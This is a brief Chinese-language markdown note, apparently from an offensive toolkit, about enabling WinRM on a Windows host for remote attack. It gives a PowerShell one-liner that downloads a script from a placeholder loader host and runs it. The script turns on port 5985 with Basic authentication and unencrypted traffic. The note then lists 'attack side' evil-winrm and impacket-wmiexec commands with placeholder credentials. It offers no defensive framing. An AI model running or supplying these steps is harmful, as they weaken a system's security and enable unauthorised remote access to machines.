# WinRM

`winrm_enable.ps1`：5985 + Basic 认证 + AllowUnencrypted（便于 evil-winrm / wmiexec 直连）。

```powershell
irm http://LOADER_IP:8090/winrm/winrm_enable.ps1 | iex
```

攻击侧：
```bash
evil-winrm -i <IP> -u <user> -p <pass>
impacket-wmiexec <user>:<pass>@<IP>
```
